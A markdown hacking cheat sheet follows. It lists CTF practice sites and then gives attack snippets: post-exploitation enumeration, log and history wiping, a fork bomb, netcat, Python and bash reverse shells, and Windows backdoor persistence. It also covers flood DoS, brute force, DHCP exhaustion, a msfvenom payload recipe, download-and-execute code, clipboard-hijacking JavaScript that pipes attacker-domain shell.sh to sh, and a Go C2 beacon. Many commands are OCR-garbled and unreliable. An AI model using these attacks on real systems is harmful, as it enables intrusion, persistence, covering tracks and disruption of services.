# :boom: Free Resources to Practice:

Share with your friends:

```
·       Academy Hackaflag BR - https://hackaflag.com.br/
·       Attack-Defense - https://attackdefense.com
·       Alert to win - https://alf.nu/alert1
·       CTF Komodo Security - https://ctf.komodosec.com
·       CMD Challenge - https://cmdchallenge.com
·       Explotation Education - https://exploit.education
·       Google CTF - https://lnkd.in/e46drbz8
·       HackTheBox - https://www.hackthebox.com
·       Hackthis - https://www.hackthis.co.uk
·       Hacksplaining - https://lnkd.in/eAB5CSTA
·       Hacker101 - https://ctf.hacker101.com
·       Hacker Security - https://lnkd.in/ex7R-C-e
·       Hacking-Lab - https://hacking-lab.com/
·       HSTRIKE - https://hstrike.com
·       ImmersiveLabs - https://immersivelabs.com
·       NewbieContest - https://lnkd.in/ewBk6fU5
·       OverTheWire - http://overthewire.org
·       Practical Pentest Labs - https://lnkd.in/esq9Yuv5
·       Pentestlab - https://pentesterlab.com
·       Penetration Testing Practice Labs - https://lnkd.in/e6wVANYd
·       PentestIT LAB - https://lab.pentestit.ru
·       PicoCTF - https://picoctf.com
·       PWNABLE - https://lnkd.in/eMEwBJzn
·       Root-Me - https://www.root-me.org
·       Root in Jail - http://rootinjail.com
·       SANS Challenger - https://lnkd.in/e5TAMawK
·       SmashTheStack - https://lnkd.in/eVn9rP9p
·       The Cryptopals Crypto Challenges - https://cryptopals.com
·       Try Hack Me - https://tryhackme.com
·       Vulnhub - https://www.vulnhub.com
·       W3Challs - https://w3challs.com
·       WeChall - http://www.wechall.net
·       Zenk-Security - https://lnkd.in/ewJ5rNx2
```

# Linux System Enumeration / Post Exploitation

```
id
w
who -a
last -a
ps -ef
df -h
uname -a
mount
cat /etc/issue
cat /etc/release
cat /proc/version
```

# Linux Miscellaneous Commands / Covering Tracks

```
chattr (+/-)i file
unset HISTFILE
unset HISTFILESIZE
unset HISTSIZE
echo "" /var/log/auth.log 
echo '''' -/.bash history
kill -9 $$
ln /dev/null -/.bash_historj -sf
```

# Fork Bomb

```
:(){:I: &I;:
```

# TCPDump

```
tcpdump -i ethO -XX -w out.pcap
tcpdump -i ethO port XX dst X.X.X.X
```

# Windows System Enumeration

```
ver
sc query state=all
tasklist /svc
tasklist /m
tasklist /S ip /v
taskkill /PID pid /F
systeminfo /S ip /U domain\user /P Pwd
dir /a /s /b c:\'.pdf'
dir /a /b c:\windows\kb'
findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
reg save HKLl~\Security security.hive echo %USERNAl~E%
```

# Start RDP

```
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
(Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

# PowerShell Enumeration

```
Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
Get-Service I where object {$ .status -eq ''Running''}
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential( 11 title ", 11 message 11 1 11 user" 11 domain")
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subject11 -a " attachment file path " -body "Body" -SmtpServer Target Email Server IP
```

# PowerShell Launching Meterpreter Payload

1. msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.ps1
2. Move audit.ps1 into same folder as encodeMeterpreter.ps1
3. Launch Powershell (x86)
4. powershell.exe -executionpolicy bypass encodeMeterpreter.ps1
5. Copy the encoded Meterpreter string

# Windows User Lockout

```
@echo T est run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
```

# Windows DHCP Exhaustion

```
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
```

# Rolling Reboot

```
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message''
```

# TTL Fingerprinting

```
Windows : 128 
Linux : 64 
Network : 255 
Solaris : 255
```

# Cisco IOS 11.2 - 12.2 Vulnerability

```
http://ip/level/16-99/exec/show/config
```

# FTP Through Non-Interactive Shell

```
echo open ip 21 ftp.txt
echo user
echo pass
echo bin
echo GET file=tp.txt echo bfe ftp.txt
ftp -s:ftp.txt
```

# NetCat Listeners

```
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
```

# Python Reverse Shell

```
python -c 'import socket,subprocess,os; s=socket.socket(socket..;;F_INET, socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
p~subprocess.call( 1"/bin/sh","-i"] I;'
```

# Bash Reverse Shell

```
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

# Windows Persistence

```
1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

# HPING3 DoS

```
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

# Hydra Online Brute Force

```
hydra -1 ftp -P words -v targetiP ftp
```

# Download HTTP File and Execute

```
#!/usr/bin/python import urllib2, os
urls = [11 1.1.1.1'',"2.2.2.2"] port = 11 80"
payload = "cb.sh"
for url in urls:
u = "http://%s:%s/%s" % (url, port, payload) try:
r = urllib2.urlopen(u)
wfile = open{"/tmp/cb.sh", "wb") wfile.write(r.read()) wfile.close ()
break
except: continue
if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
```

# Hashcat 

```
DICTIONARY ATTACK
hashcat -a 0 -m #type hash.txt
DICTIONARY + RULES ATTACK
hashcat -a 0 -m #type hash.txt
COMBINATION ATTACK
hashcat -a 1 -m #type hash.txt
MASK ATTACK
hashcat -a 3 -m #type hash.txt
HYBRID DICTIONARY + MASK
hashcat -a 6 -m #type hash.txt
HYBRID MASK + DICTIONARY
hashcat -a 7 -m #type hash.txt
dict.txt
dict.txt -r rule.txt
dict1.txt dict2.txt
?a?a?a?a?a?a
dict.txt ?a?a?a?a
?a?a?a?a dict.txt
```

# Malicious Javascript

```
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
 </script>
 ```
# Execute Fileless Scripts in Golang

```
package main

import (
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    for {
        url := "http://my_command_control:8080/executeThisScript" // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beaconing
    }
}
```

# Enumerating IPs with IPInfo

```curl ipinfo.io/54.90.107.240```

```
{
  "ip": "54.90.107.240",
  "hostname": "ec2-54-90-107-240.compute-1.amazonaws.com",
  "city": "Virginia Beach",
  "region": "Virginia",
  "country": "US",
  "loc": "36.8512,-76.1692",
  "org": "AS14618 Amazon.com, Inc.",
  "postal": "23465",
  "readme": "https://ipinfo.io/missingauth"
}
```

# Email Recon

```curl emailrep.io/john.smith@gmail.com```

```
{
  "email": "john.smith@gmail.com",
  "reputation": "high",
  "suspicious": false,
  "references": 91,
  "details": {
    "blacklisted": false,
    "malicious_activity": false,
    "malicious_activity_recent": false,
    "credentials_leaked": true,
    "credentials_leaked_recent": false,
    "data_breach": true,
    "last_seen": "07/27/2019",
    "domain_exists": true,
    "domain_reputation": "n/a",
    "new_domain": false,
    "days_since_domain_creation": 8773,
    "suspicious_tld": false,
    "spam": false,
    "free_provider": true,
    "disposable": false,
    "deliverable": true,
    "accept_all": false,
    "valid_mx": true,
    "spoofable": true,
    "spf_strict": true,
    "dmarc_enforced": false,
    "profiles": [
      "lastfm",
      "pinterest",
      "foursquare",
      "aboutme",
      "spotify",
      "twitter",
      "vimeo"
    ]
  }
}
```

# nrich IP Enumeration:

A command-line tool to quickly analyze all IPs in a file and see which ones have open ports/ vulnerabilities. Can also be fed data from stdin to be used in a data pipeline.

## Install:

```
$ wget https://gitlab.com/api/v4/projects/33695681/packages/generic/nrich/latest/nrich_latest_amd64.deb
$ sudo dpkg -i nrich_latest_amd64.deb
```

## Confirmation:

```
$ echo 149.202.182.140 | nrich -
149.202.182.140 (ftptech1.pcsoft.fr)
  Ports: 21, 80, 111, 443
  CPEs: cpe:/a:proftpd:proftpd:1.3.5b, cpe:/a:apache:http_server:2.4.25
  Vulnerabilities: CVE-2018-11763, CVE-2019-0220, CVE-2017-15710, CVE-2018-1312, CVE-2019-0197, CVE-2017-9798, CVE-2018-1283, CVE-2017-7668, CVE-2017-3169, CVE-2017-15715, CVE-2017-7659, CVE-2018-1333, CVE-2019-0211, CVE-2019-12815, CVE-2017-3167, CVE-2017-9788, CVE-2019-0196, CVE-2017-7679, CVE-2018-17199
```

## Usage:

```
$ nrich --help
nrich 0.1.0
Add network information to IPs

USAGE:
    nrich [OPTIONS] <filename>

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -o, --output <output>    Output format (shell or json) [default: shell]

ARGS:
    <filename>    File containing an IP per line. Non-IPs are ignored
```

# Enumerating Anonymous FTP Logins Using Python:

```
#!/usr/bin/python3

from ftplib import FTP
import sys

ips = open(sys.argv[1], 'r')
r = ips.readlines()
for item in r:
    item = item.strip()
    print("[+] Connecting to: %s \n" %item)
    try:
        ftp = FTP(item, timeout=3) 
        ftp.login()
       
        if ftp.retrlines('LIST') != 0:
            print("[+] Anonymous login enabled on Host: %s \n" %item)
            print("="*70+"\n")
    except:
        print("[+] Unable to Connect to Host: %s\n" %item)
        print("="*70+"\n")
```

1. Usage : ```python3 FTPLoginChecker.py ip_addresses.txt```
2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
3. Search Keyword : ```230 anonymous```
